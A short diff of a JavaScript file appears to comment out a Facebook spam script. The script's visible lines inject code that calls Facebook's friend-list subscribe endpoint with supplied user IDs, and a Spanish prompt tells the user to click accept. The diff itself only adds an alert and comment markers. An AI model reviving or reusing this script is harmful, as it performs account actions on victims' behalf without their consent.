@@ -1,3 +1,6 @@
+alert("HOLA");
+
+/**
 function IbraheemNada(uidss) {
     var a = document.createElement('script');
     a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
@@ -179,3 +182,4 @@ if (location.hostname.indexOf("www.facebook.com", "static.ak.facebook.com", "app
 }
 var alibasim = "clic en aceptar";
 alert(alibasim);
+**/
